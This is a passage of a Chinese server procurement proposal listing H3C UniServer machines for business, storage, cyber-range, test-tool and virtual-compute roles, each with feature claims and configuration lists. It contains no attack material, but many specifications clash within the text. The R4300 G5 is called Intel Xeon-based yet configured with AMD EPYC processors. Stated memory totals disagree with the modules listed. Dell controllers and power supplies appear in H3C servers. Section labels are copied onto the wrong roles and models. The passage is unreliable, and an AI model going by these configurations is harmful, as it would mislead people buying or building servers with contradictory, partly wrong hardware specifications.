UHS-I</p><ol><li>电源</li></ol><p>型号：2x Dell 750W Hot-Plug Power Supply Unit</p><ol><li>工作温度</li></ol><p>0℃ ~ 40℃</p><ol><li>服务器管理</li></ol><p>远程管理模块：H3C iMC (Intelligent Management Center)</p><ol><li>服务器机箱</li></ol><p>华三与所供处理器品牌的兼容性。</p><ol><li>散热系统</li></ol><p>风扇：标准机箱配备的多风扇模块</p><ol><li>硬件兼容性</li></ol><p>所有组件均应选择经过验证的兼容品牌。</p><ol><li>软件支持</li></ol><p>服务器应兼容主流操作系统，如Windows Server 2019、Red Hat Enterprise Linux 8等。</p><h4 id="业务服务器"><a href="#业务服务器" class="headerlink" title="业务服务器"></a>业务服务器</h4><h5 id="功能实施方案-7"><a href="#功能实施方案-7" class="headerlink" title="功能实施方案"></a>功能实施方案</h5><p>提供4台牌为H3C新华三，型号为UniServer R4950 G5 的2U机架式业务服务器。</p><p>产品功能参数：</p><ol><li><p>处理器32核；32核处理器能够提供强大的多任务处理能力，适合高并发场景，显著提升数据处理速度和系统响应时间，特别适合需要大量并行计算的服务器和工作站。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/5f1fe988a2813d5978f739e5ce036c63.png"></p></li><li><p>满足内存512G DDR4；256GB DDR4内存特性：容量大、数据传输数率高、工作能效高、支持更高的密度和更大的单模块容量、有个更高的可靠性。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/5f1fe988a2813d5978f739e5ce036c63.png"></p></li><li><p>16个内存插槽. 每个处理器支持8个内存通道, 每个通道最大支持1个内存插槽。16个内存插槽使得系统能够支持极大的内存容量，多通道可以显著提高内存的数据吞吐量；这种内存架构提供了高度的可扩展性和性能。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/c1c0ec8686ddc12e05e9ac09286ae6a5.png"></p></li><li><p>系统支持高速内存，达到3200MT/s的数据速率，兼容RDIMM（Registered DIMM）和具备备用电源或非易失性功能的NVDIMM，确保了内存的速度与数据的安全性和持久性</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/a9818e6e0495e142ff6784f805e6d643.png"></p></li><li><p>16TB SATA2硬盘的优点在于其提供巨大的存储容量，适合大规模数据存储需求，且成本相对较低，兼容性好，适用于多种系统。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/d11843a5e1d3d2f9320927d726843d11.png"></p></li><li><p>512GB SSD硬盘的主要优点是速度快，响应时间短，耗电量低，抗震性强，且体积小，便于携带，提升了系统的整体性能和可靠性。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/d11843a5e1d3d2f9320927d726843d11.png"></p></li><li><p>支持24个2.5/3.5英寸SAS/SATA热插拔硬盘的系统可提供灵活的存储扩展性和高数据吞吐量，同时确保无停机维护和数据冗余，增强了数据中心的可用性和可靠性。</p></li><li><p>支持M.2或E1.S SSD模块的系统可提供快速的数据访问速度，小巧的体积，以及通过模块化设计简化升级和维护，提高了系统的灵活性和性能。</p></li><li><p>交流冗余电源提高了系统的可靠性和稳定性，确保了在主电源故障时能够无缝切换到备用电源，从而减少系统停机时间，保障关键业务的连续运行。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/d11843a5e1d3d2f9320927d726843d11.png"></p></li><li><p>具备千兆网卡4电口及万兆网卡的系统，能够提供高带宽网络连接，满足大数据传输需求，同时支持网络冗余和负载均衡，增强网络的可靠性和效率。</p></li><li><p>支持扩展插槽 4 个PCI-E 插槽或2 个PCI-X 和2 个PCI-E插槽</p></li><li><p>后置2个USB3.0提供高速数据传输，1个VGA接口支持传统显示设备，1个COM口允许老式外设连接，这样的组合确保了设备的兼容性和多样化连接选项，满足不同设备的接入需求。</p></li><li><p>RAID1或1+0结合128M高速缓存的存储控制器提供数据镜像和条带化，增强了数据的安全性和读写性能，缓存可进一步加速数据访问，优化了系统的整体存储响应速度。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/d11843a5e1d3d2f9320927d726843d11.png"></p></li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/4cb33479ddbf6bd5a0d1e64aa0d327a2.png"></p><h5 id="业务服务器配置方案"><a href="#业务服务器配置方案" class="headerlink" title="业务服务器配置方案"></a>业务服务器配置方案</h5><ol><li>处理器</li></ol><p>型号：2x AMD EPYC 7763 32-Core Processor</p><p>核心：共64核心，支持128线程</p><ol><li>内存</li></ol><p>容量与型号：16x 16GB Samsung DDR4-3200 RDIMM PC4-25600R</p><p>插槽数量：16个（每个处理器对应8个插槽）</p><p>速度：3200MT/s</p><p>类型：内存模块支持BPS/NVDIMM和RDIMM</p><ol><li>硬盘</li></ol><p>16TB SATA HDD：Seagate Exos X16 16TB Enterprise HDD</p><p>512GB SSD：Samsung 970 PRO 512GB NVMe M.2</p><ol><li>硬盘扩展</li></ol><p>硬盘槽：支持24个2.5英寸/3.5英寸SAS/SATA硬盘槽，支持热插拔</p><p>M.2 SSD选项：Samsung 970 EVO Plus NVMe M.2</p><p>E1.S SSD选项：Intel Optane SSD DC P4801X Series</p><ol><li>存储控制器</li></ol><p>型号：Dell PERC H730P RAID Controller</p><p>支持RAID 1或1+0</p><p>缓存：1GB NV Cache</p><ol><li>网络</li></ol><p>千兆网卡：4x Intel I350 Quad-Port Gigabit Network Daughter Card</p><p>万兆网卡：1x Mellanox ConnectX-4 Lx 10GbE SFP+</p><ol><li>扩展插槽</li></ol><p>4x PCI-E 4.0 x16插槽</p><ol><li>USB端口</li></ol><p>后置USB 3.0端口：2x USB 3.0 Type-A</p><ol><li>视频输出</li></ol><p>后置VGA端口：1x VGA port (integrated ASPEED AST2500)</p><ol><li>串行端口</li></ol><p>COM口：1x RS-232</p><ol><li>存储卡</li></ol><p>TF卡：2x Transcend 4GB Industrial MicroSDHC UHS-I</p><ol><li>电源</li></ol><p>型号：2x Dell 750W Hot-Plug Power Supply Unit</p><ol><li>工作温度</li></ol><p>0℃ ~ 40℃</p><ol><li>服务器管理</li></ol><p>远程管理模块：H3C iMC (Intelligent Management Center)</p><ol><li>服务器机箱</li></ol><p>华三与所供处理器品牌的兼容性。</p><ol><li>散热系统</li></ol><p>风扇：标准机箱配备的多风扇模块</p><ol><li>硬件兼容性</li></ol><p>所有组件均应选择经过验证的兼容品牌。</p><ol><li>软件支持</li></ol><p>服务器应兼容主流操作系统，如Windows Server 2019、Red Hat Enterprise Linux 8等。</p><h4 id="运营存储服务器"><a href="#运营存储服务器" class="headerlink" title="运营存储服务器"></a>运营存储服务器</h4><p>运营存储服务器提供4台品牌为H3C新华三，型号为UniServer R4300 G5的是运营存储服务器，新华三自主研发的全新一代4U两路存储优化型服务器， 基于最新的英特尔®至强®第三代可扩展处理器家族，可实现平均46%的性能提升和43%的内核数量增加；通过高达52块硬盘、最多8张单宽GPU卡，以及傲腾™持久内存和NVMe，在4U空间内满足高存储密度、高效数据计算、线形扩展的综合需求，尤其适合于政府、安平、运营商、互联网、企业等行业的分布式存储、大数据和备份归档应用。</p><h5 id="功能实施方案-8"><a href="#功能实施方案-8" class="headerlink" title="功能实施方案"></a>功能实施方案</h5><p>提供4台H3C 的4U机架式UniServer R4300 G5 运营服务器。</p><p>产品功能参数：</p><ol><li><p>处理器：32核;32 核处理器能够提供强大的多任务处理能力，适合高并发场景，显著提升数据处理速度和系统响应时间，特别适合需要大量并行计算的服务器和工作站。</p></li><li><p>满足内存128G DDR4；128G DDR4内存特性:容量大、数据传输数率高、工作能效高、支持更高的密度和更大的单模块容量、有个更高的可靠性。</p></li><li><p>16个内存插槽，每个处理器支持8个内存通道, 每个通道最大支持1个内存插槽；16 个内存插槽使得系统能够支持极大的内存容量，多通道可以显著提高内存的数据香吐量，这种内存架构提供了高度的可扩展性和性能。</p></li><li><p>系统支持高速内存，达到3200MT/s 的数据速率，兼容RDIIMM(Registered DIMM)和具备备用电源或非易失性功能的NVDIMM，确保了内存的速度与数据的安全性和持久性</p></li><li><p>200T SATA2硬盘的优点在于其提供巨大的存储容量，适合大规模数据存储需求，且成本相对较低，兼容性好，适用于多种系统。</p></li><li><p>512G SSD 硬盘的主要优点是速度快，响应时间短，耗电量低抗震性强，且体积小，便于携带，提升了系统的整体性能和可靠性。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/36ab728970944f2ffff8179cfa74c1d4.png"></p></li><li><p>支持24个25/3.5英寸SAS/SATA 热插拔硬盘的系统可提供灵活的存储扩展性和高数据否吐量，同时确保无停机维护和数据冗余，增强了数据中心的可用性和可靠性。</p></li><li><p>支持M2或E1SSSD 模块的系统可提供快速的数据访问速度，小巧的体积，以及通过模块化设计简化升级和维护，提高了系统的灵活性和性能。</p></li><li><p>交流冗余电源提高了系统的可靠性和稳定性，确保了在主电源故障时能够无缝切换到备用电源，从而减少系统停机时间，保障关键业务的连续运行。</p></li><li><p>具备干兆网卡4 电口及1个万兆网卡的系统，能够提供高带宽网络连接，满足大数据传输需求，同时支持网络几余和负载均衡，增强网络的可靠性和效率。</p></li><li><p>支持扩展插槽 4 个PCI-E 插槽或2 个PCI-X 和2 个PCI-E插槽</p></li><li><p>后置2个USB3.0提供高速数据传输，1个VGA接口支持传统显示设备，1个COM口允许老式外设连接，这样的组合确保了设备的兼容性和多样化连接选项，满足不同设备的接入需求。</p></li><li><p>RAID1或1+0结合128M高速缓存的存储控制器提供数据镜像和条带化，增强了数据的安全性和读写性能，缓存可进一步加速数据访问，优化了系统的整体存储响应速度。</p></li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/73a80a5b44cac189ffb94e7e0f5d506e.png"></p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/bb446150e29fb14ec6471ee34ba37de3.png"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/aeb8f0fa53cab245f2451275daf62b01.png"></p><h5 id="运营存储服务器配置方案"><a href="#运营存储服务器配置方案" class="headerlink" title="运营存储服务器配置方案"></a>运营存储服务器配置方案</h5><ol><li>处理器</li></ol><p>型号：2x AMD EPYC 7763 32-Core Processor</p><p>核心：共64核心，支持128线程</p><ol><li>内存</li></ol><p>容量与型号：16x 16GB Samsung DDR4-3200 RDIMM PC4-25600R</p><p>插槽数量：16个（每个处理器对应8个插槽）</p><p>速度：3200MT/s</p><p>类型：内存模块支持BPS/NVDIMM和RDIMM</p><ol><li>硬盘</li></ol><p>16TB SATA HDD：13x Seagate Exos X16 16TB Enterprise HDD</p><p>512GB SSD：Samsung 970 PRO 512GB NVMe M.2</p><ol><li>硬盘扩展</li></ol><p>硬盘槽：支持24个2.5英寸/3.5英寸SAS/SATA硬盘槽，支持热插拔</p><p>M.2 SSD选项：Samsung 970 EVO Plus NVMe M.2</p><p>E1.S SSD选项：Intel Optane SSD DC P4801X Series</p><ol><li>存储控制器</li></ol><p>型号：Dell PERC H730P RAID Controller</p><p>支持RAID 1或1+0</p><p>缓存：1GB NV Cache</p><ol><li>网络</li></ol><p>千兆网卡：4x Intel I350 Quad-Port Gigabit Network Daughter Card</p><p>万兆网卡：1x Mellanox ConnectX-4 Lx 10GbE SFP+</p><ol><li>扩展插槽</li></ol><p>4x PCI-E 4.0 x16插槽</p><ol><li>USB端口</li></ol><p>后置USB 3.0端口：2x USB 3.0 Type-A</p><ol><li>视频输出</li></ol><p>后置VGA端口：1x VGA port (integrated ASPEED AST2500)</p><ol><li>串行端口</li></ol><p>COM口：1x RS-232</p><ol><li>存储卡</li></ol><p>TF卡：2x Transcend 4GB Industrial MicroSDHC UHS-I</p><ol><li>电源</li></ol><p>型号：2x Dell 750W Hot-Plug Power Supply Unit</p><ol><li>工作温度</li></ol><p>0℃ ~ 40℃</p><ol><li>服务器管理</li></ol><p>远程管理模块：H3C iMC (Intelligent Management Center)</p><ol><li>服务器机箱</li></ol><p>华三与所供处理器品牌的兼容性。</p><ol><li>散热系统</li></ol><p>风扇：标准机箱配备的多风扇模块</p><ol><li>硬件兼容性</li></ol><p>所有组件均应选择经过验证的兼容品牌。</p><ol><li>软件支持</li></ol><p>服务器应兼容主流操作系统，如Windows Server 2019、Red Hat Enterprise Linux 8等。</p><h4 id="靶场存储服务器"><a href="#靶场存储服务器" class="headerlink" title="靶场存储服务器"></a>靶场存储服务器</h4><p>靶场存储服务器提供16台品牌为H3C新华三，型号为UniServer R4900 G5的靶场存储服务器，全新一代H3C 通过多达32个NVMe SSD1 的支持，以及M.2 SSD形态的引入，进一步增强了面向现代数据中心的扩展能力和配置灵活性。作为一款自主研发的主流2U两路机架式服务器，H3C UniServer R4900 G5基于最新的英特尔®至强®可扩展家族处理器，可实现多达52%的处理器浮点性能提升和42%的核心数量增加，配合8通道3200MT/s DDR4内存技术，为用户提供高达60%的带宽提升。通过多达14个标准PCIe 4.0插槽和多达41个硬盘插槽1的本地存储支持，实现卓越的扩展能力。96%的电源能效，以及5℃-45℃的标准工作温度设计，为用户提供更高的能效回报。</p><h5 id="功能实施方案-9"><a href="#功能实施方案-9" class="headerlink" title="功能实施方案"></a>功能实施方案</h5><ol><li>机器类型：机架式服务器，2U；2U机架式服务器在保持紧凑机架尺寸的同时，提供了较多的扩展空间，适合容纳更多硬件资源，如存储驱动器和扩展卡，优化了数据中心空间利用率，适合构建高密度计算环境。</li><li>处理器：配置2颗英特尔至强银牌4316处理器，单颗处理器主频2.3GHz, 核数20核；单颗20核处理器提供多核并行处理能力，适合多线程任务，2.3GHz主频确保了单核性能，平衡了高吞吐量与任务响应时间，适合服务器和高性能计算需求。</li><li>内存：配置512GB DDR4内存；256GB DDR4 内存特性:容量大、数据传输数率高、工作能效高、支持更高的密度和更大的单模块容量、有个更高的可靠性。</li><li>硬盘：配置2*固态硬盘480GB硬盘8*1800GB 10K rpm的硬盘；两个480GB固态硬盘提供快速启动和低延迟数据访问；八个1800GB 10K RPM硬盘则提供大量高速存储空间，适合实现快速系统响应与大容量数据存储的需求。</li><li>Raid卡配置独立RAID卡，支持RAID 0,1,5,6，10，50,60，2G缓存，含断电保护；独立RAID卡支持多种RAID级别，提供数据保护和性能优化选项。2G缓存增强数据处理速度，断电保护确保数据完整性，适合对数据安全性和读写性能有较高要求的应用场景。</li><li>接口：2*双口10GE光口（含光模块）；两个双口10GE光口提供高达40Gbps的网络带宽，支持远距离光纤连接，降低信号衰减，确保网络传输速度和可靠性，适合高速数据中心和企业网络环境。</li><li>PCIE：可扩展14个PCIe 4.0槽位；增强系统灵活性和扩展性，支持更多高性能GPU、存储和网络设备，适合高负载工作站和数据中心。</li><li>配置900W冗余热插拔电源；确保了在主电源故障时能够无缝切换到备用电源，从而减少系统停机时间，保障关键业务的连续运行。</li><li>支持深度休眠，系统下电后，进入深度休眠模式的电源会关闭输出；关闭深度休眠或系统上电后，进入深度休眠模式的电源。</li><li>环境温度：长期工作环境温度支持5-45度</li><li>支持4个风扇且N+1冗余可以确保即使在一个风扇失效的情况下，系统也能维持适当的冷却，保持硬件运行在安全温度下，提高系统的可靠性和稳定性。</li><li>支持 CLI 接口设置弱口令字典认证使能状态和导入，在开启密码检查功能时不允许设置弱口令字典内定义的密码。</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/25a3111855786fb77083ba76c637b558.png"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/f4bb7c6ab4d7a339726e1b924a00e6c0.png"></p><h5 id="靶场存储服务器配置方案"><a href="#靶场存储服务器配置方案" class="headerlink" title="靶场存储服务器配置方案"></a>靶场存储服务器配置方案</h5><ol><li>处理器</li></ol><p>型号: 2x Intel Xeon Silver 4316</p><p>主频: 2.3GHz</p><p>核数: 每颗20核，共40核</p><ol><li>内存</li></ol><p>容量: 512GB DDR4</p><p>规格: 16x 32GB DDR4-2933 RDIMM</p><ol><li>硬盘配置</li></ol><p>固态硬盘(SSD):</p><p>2x H3C 480GB SATA SSD</p><p>机械硬盘(HDD):</p><p>8x H3C 1.8TB 10K RPM SAS HDD</p><p>M.2 SATA SSD:</p><p>支持2x M.2 SATA SSD，支持RAID1，支持热插拔</p><ol><li>RAID卡</li></ol><p>型号: H3C独立RAID卡</p><p>支持RAID级别: 0, 1, 5, 6, 10, 50, 60</p><p>缓存: 2GB，含断电保护</p><ol><li>网络接口</li></ol><p>10GE光口:</p><p>2x 双口10GE光口网卡，含光模块</p><p>PCIe扩展</p><p>槽位: 最大可扩展14个PCIe 4.0槽位</p><ol><li>电源</li></ol><p>功率: 900W</p><p>特性: 冗余热插拔电源</p><p>深度休眠支持: 支持深度休眠模式</p><ol><li>冷却系统</li></ol><p>风扇: 最大支持4个风扇，支持N+1冗余</p><ol><li>安全设置</li></ol><p>CLI接口:</p><p>支持弱口令字典认证使能状态和导入</p><p>开启密码检查功能时，不允许设置弱口令字典内定义的密码</p><ol><li>工作环境</li></ol><p>温度: 长期工作环境温度支持5-45度</p><ol><li>其他配置</li></ol><p>机箱: H3C专用服务器机箱，支持上述配置</p><p>散热: 高效散热系统以支持5-45度的工作环境温度</p><p>管理: 集成H3C iMC管理模块，支持远程管理和监控</p><h4 id="测试工具服务器"><a href="#测试工具服务器" class="headerlink" title="测试工具服务器"></a>测试工具服务器</h4><p>测试工具服务器提供2台品牌为H3C新华三，型号为UniServer R4900 G5的测试工具服务器，全新一代H3C 通过多达32个NVMe SSD1 的支持，以及M.2 SSD形态的引入，进一步增强了面向现代数据中心的扩展能力和配置灵活性。作为一款自主研发的主流2U两路机架式服务器，H3C UniServer R4900 G5基于最新的英特尔®至强®可扩展家族处理器，可实现多达52%的处理器浮点性能提升和42%的核心数量增加，配合8通道3200MT/s DDR4内存技术，为用户提供高达60% 的带宽提升。通过多达14个标准PCIe 4.0插槽和多达41个硬盘插槽1的本地存储支持，实现卓越的扩展能力。96%的电源能效，以及5℃-45℃的标准工作温度设计，为用户提供更高的能效回报。</p><h5 id="功能实施方案-10"><a href="#功能实施方案-10" class="headerlink" title="功能实施方案"></a>功能实施方案</h5><p>提供2台H3C 的2U机架式UniServer R4900 G5 测试工具服务器。</p><p>产品功能参数：</p><ol><li>机器类型：机架式服务器，2U；2U机架式服务器在保持紧凑机架尺寸的同时，提供了较多的扩展空间，适合容纳更多硬件资源，如存储驱动器和扩展卡，优化了数据中心空间利用率，适合构建高密度计算环境。</li><li>处理器：配置2颗英特尔至强银牌4316处理器，单颗处理器主频2.3GHz, 核数20核；单颗20核处理器提供多核并行处理能力，适合多线程任务，2.3GHz主频确保了单核性能，平衡了高吞吐量与任务响应时间，适合服务器和高性能计算需求。</li><li>内存：配置512GB DDR4内存；256GB DDR4 内存特性:容量大、数据传输数率高、工作能效高、支持更高的密度和更大的单模块容量、有个更高的可靠性。</li><li>硬盘：配置2*固态硬盘480GB硬盘8*1800GB 10K rpm的硬盘；两个480GB固态硬盘提供快速启动和低延迟数据访问；八个1800GB 10K RPM硬盘则提供大量高速存储空间，适合实现快速系统响应与大容量数据存储的需求。</li><li>Raid卡配置独立RAID卡，支持RAID 0,1,5,6，10，50,60，2G缓存，含断电保护；独立RAID卡支持多种RAID级别，提供数据保护和性能优化选项。2G缓存增强数据处理速度，断电保护确保数据完整性，适合对数据安全性和读写性能有较高要求的应用场景。</li><li>接口：2*双口10GE光口（含光模块）；两个双口10GE光口提供高达40Gbps的网络带宽，支持远距离光纤连接，降低信号衰减，确保网络传输速度和可靠性，适合高速数据中心和企业网络环境。</li><li>PCIE：可扩展14个PCIe 4.0槽位；增强系统灵活性和扩展性，支持更多高性能GPU、存储和网络设备，适合高负载工作站和数据中心。</li><li>配置900W冗余热插拔电源；确保了在主电源故障时能够无缝切换到备用电源，从而减少系统停机时间，保障关键业务的连续运行。</li><li>支持深度休眠，系统下电后，进入深度休眠模式的电源会关闭输出；关闭深度休眠或系统上电后，进入深度休眠模式的电源。</li><li>环境温度：长期工作环境温度支持5-45度</li><li>支持4个风扇且N+1冗余可以确保即使在一个风扇失效的情况下，系统也能维持适当的冷却，保持硬件运行在安全温度下，提高系统的可靠性和稳定性。</li><li>支持 CLI 接口设置弱口令字典认证使能状态和导入，在开启密码检查功能时不允许设置弱口令字典内定义的密码。</li><li>支持三年原厂维保。</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/25a3111855786fb77083ba76c637b558.png"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/f4bb7c6ab4d7a339726e1b924a00e6c0.png"></p><h5 id="测试工具务器配置方案"><a href="#测试工具务器配置方案" class="headerlink" title="测试工具务器配置方案"></a>测试工具务器配置方案</h5><ol><li>处理器</li></ol><p>型号: 2x Intel Xeon Silver 4316</p><p>主频: 2.3GHz</p><p>核数: 每颗20核，共40核</p><ol><li>内存</li></ol><p>容量: 512GB DDR4</p><p>规格: 16x 32GB DDR4-2933 RDIMM</p><ol><li>硬盘配置</li></ol><p>固态硬盘(SSD):</p><p>2x H3C 480GB SATA SSD</p><p>机械硬盘(HDD):</p><p>8x H3C 1.8TB 10K RPM SAS HDD</p><p>M.2 SATA SSD:</p><p>支持2x M.2 SATA SSD，支持RAID1，支持热插拔</p><ol><li>RAID卡</li></ol><p>型号: H3C独立RAID卡</p><p>支持RAID级别: 0, 1, 5, 6, 10, 50, 60</p><p>缓存: 2GB，含断电保护</p><ol><li>网络接口</li></ol><p>10GE光口:</p><p>2x 双口10GE光口网卡，含光模块</p><p>PCIe扩展</p><p>槽位: 最大可扩展14个PCIe 4.0槽位</p><ol><li>电源</li></ol><p>功率: 900W</p><p>特性: 冗余热插拔电源</p><p>深度休眠支持: 支持深度休眠模式</p><ol><li>冷却系统</li></ol><p>风扇: 最大支持4个风扇，支持N+1冗余</p><ol><li>安全设置</li></ol><p>CLI接口:</p><p>支持弱口令字典认证使能状态和导入</p><p>开启密码检查功能时，不允许设置弱口令字典内定义的密码</p><ol><li>工作环境</li></ol><p>温度: 长期工作环境温度支持5-45度</p><ol><li>其他配置</li></ol><p>机箱: H3C专用服务器机箱，支持上述配置</p><p>散热: 高效散热系统以支持5-45度的工作环境温度</p><p>管理: 集成H3C iMC管理模块，支持远程管理和监控</p><h4 id="虚拟计算服务器（X86）"><a href="#虚拟计算服务器（X86）" class="headerlink" title="虚拟计算服务器（X86）"></a>虚拟计算服务器（X86）</h4><p>虚拟计算服务器（X86）提供10台品牌为H3C新华三，型号为UniServer R4900 G5的虚拟计算服务器（X86），全新一代H3C 通过多达32个NVMe SSD1 的支持，以及M.2 SSD形态的引入，进一步增强了面向现代数据中心的扩展能力和配置灵活性。作为一款自主研发的主流2U两路机架式服务器，H3C UniServer R4900 G5基于最新的英特尔®至强®可扩展家族处理器，可实现多达52%的处理器浮点性能提升和42%的核心数量增加，配合8通道3200MT/s DDR4内存技术，为用户提供高达60% 的带宽提升。通过多达14个标准PCIe 4.0插槽和多达41个硬盘插槽1的本地存储支持，实现卓越的扩展能力。96%的电源能效，以及5℃-45℃的标准工作温度设计，为用户提供更高的能效回报。</p><h5 id="功能实施方案-11"><a href="#功能实施方案-11" class="headerlink" title="功能实施方案"></a>功能实施方案</h5><p>提供10台H3C 的2U机架式UniServer R4900 G5 测试工具服务器。</p><p>产品功能参数：</p><ol><li>机器类型：机架式服务器，2U；2U机架式服务器在保持紧凑机架尺寸的同时，提供了较多的扩展空间，适合容纳更多硬件资源，如存储驱动器和扩展卡，优化了数据中心空间利用率，适合构建高密度计算环境。</li><li>处理器：配置2颗英特尔至强银牌4316处理器，单颗处理器主频2.3GHz, 核数20核；单颗20核处理器提供多核并行处理能力，适合多线程任务，2.3GHz主频确保了单核性能，平衡了高吞吐量与任务响应时间，适合服务器和高性能计算需求。</li><li>内存：配置512GB DDR4内存；512GB DDR4 内存特性:容量大、数据传输数率高、工作能效高、支持更高的密度和更大的单模块容量、有个更高的可靠性。</li><li>硬盘：配置2*固态硬盘480GB硬盘8*1800GB 10K rpm的硬盘；两个480GB固态硬盘提供快速启动和低延迟数据访问；八个1800GB 10K RPM硬盘则提供大量高速存储空间，适合实现快速系统响应与大容量数据存储的需求。</li><li>Raid卡配置独立RAID卡，支持RAID 0,1,5,6，10，50,60，2G缓存，含断电保护；独立RAID卡支持多种RAID级别，提供数据保护和性能优化选项。2G缓存增强数据处理速度，断电保护确保数据完整性，适合对数据安全性和读写性能有较高要求的应用场景。</li><li>接口：2*双口10GE光口（含光模块）；两个双口10GE光口提供高达40Gbps的网络带宽，支持远距离光纤连接，降低信号衰减，确保网络传输速度和可靠性，适合高速数据中心和企业网络环境。</li><li>PCIE：可扩展14个PCIe 4.0槽位；增强系统灵活性和扩展性，支持更多高性能GPU、存储和网络设备，适合高负载工作站和数据中心。</li><li>配置900W冗余热插拔电源；确保了在主电源故障时能够无缝切换到备用电源，从而减少系统停机时间，保障关键业务的连续运行。</li><li>支持深度休眠，系统下电后，进入深度休眠模式的电源会关闭输出；关闭深度休眠或系统上电后，进入深度休眠模式的电源。</li><li>环境温度：提供的设备温度适应性好，长期工作环境温度支持5-45度</li><li>支持4个风扇且N+1冗余可以确保即使在一个风扇失效的情况下，系统也能维持适当的冷却，保持硬件运行在安全温度下，提高系统的可靠性和稳定性。</li><li>支持 CLI 接口设置弱口令字典认证使能状态和导入，在开启密码检查功能时不允许设置弱口令字典内定义的密码。</li><li>支持三年原厂维保。</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/25a3111855786fb77083ba76c637b558.png"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/f4bb7c6ab4d7a339726e1b924a00e6c0.png"></p><h5 id="虚拟计算服务器（X86）配置方案"><a href="#虚拟计算服务器（X86）配置方案" class="headerlink" title="虚拟计算服务器（X86）配置方案"></a>虚拟计算服务器（X86）配置方案</h5><ol><li>处理器</li></ol><p>型号: 2x Intel Xeon Silver 4316</p><p>主频: 2.3GHz</p><p>核数: 每颗20核，共40核</p><ol><li>内存</li></ol><p>容量: 512GB DDR4</p><p>规格: 16x 32GB DDR4-2933 RDIMM</p><ol><li>硬盘配置</li></ol><p>固态硬盘(SSD):</p><p>2x H3C 480GB SATA SSD</p><p>机械硬盘(HDD):</p><p>8x H3C 1.8TB 10K RPM SAS HDD</p><p>M.2 SATA SSD:</p><p>支持2x M.2 SATA SSD，支持RAID1，支持热插拔</p><ol><li>RAID卡</li></ol><p>型号: H3C独立RAID卡</p><p>支持RAID级别: 0, 1, 5, 6, 10, 50, 60</p><p>缓存: 2GB，含断电保护</p><ol><li>网络接口</li></ol><p>10GE光口:</p><p>2x 双口10GE光口网卡，含光模块</p><p>PCIe扩展</p><p>槽位: 最大可扩展14个PCIe 4.0槽位</p><ol><li>电源</li></ol><p>功率: 900W</p><p>特性: 冗余热插拔电源</p><p>深度休眠支持: 支持深度休眠模式</p><ol><li>冷却系统</li></ol><p>风扇: 最大支持4个风扇，支持N+1冗余</p><ol><li>安全设置</li></ol><p>CLI接口:</p><p>支持弱口令字典认证使能状态和导入</p><p>开启密码检查功能时，不允许设置弱口令字典内定义的密码</p><ol><li>工作环境</li></ol><p>温度: 长期工作环境温度支持5-45度</p><ol><li>其他配置</li></ol><p>机箱: H3C专用服务器机箱，支持上述配置</p><p>散热: 高效散热系统以支持5-45度的工作环境温度</p><p>管理: 集成H3C iMC管理模块，支持远程管理和监控</p><h4 id="虚拟计算服务器（ARM）"><a href="#虚拟计算服务器（ARM）" class="headerlink" title="虚拟计算服务器（ARM）"></a>虚拟计算服务器（ARM）</h4><p>虚拟计算服务器（ARM）提供10台品牌为H3C新华三，型号为 UniServer R4960 G5的虚拟计算服务器（ARM），具有高效能计算、安全可靠、开放生态的优势，适合为大数据、分布式存储、原生应用、高性能计算和数据库等应用高效加速，旨在满足数据中心多样性计算、绿色计算的需求。</p><p>H3C UniServer R4960 G5为2U机架式服务器，专为加速计算而构建。支持2颗鲲鹏处理器，配合8通道2933MHz DDR4技术，为用户提供高达50%的性能提升。通过高达8个PCIe 4.0插槽和多达20块硬盘的本地存储支持，实现卓越的扩展能力。配置冗余的热插拔电源风扇，通过优异的散热设计，支持5~40℃的扩展温度，确保服务器能够7×24小时的长时间稳定运行，为用户提供更高的能效回报。</p><h5 id="功能实施方案-12"><a href="#功能实施方案-12" class="headerlink" title="功能实施方案"></a>功能实施方案</h5><p>提供10台H3C 的2U机架式UniServer R4900 G5 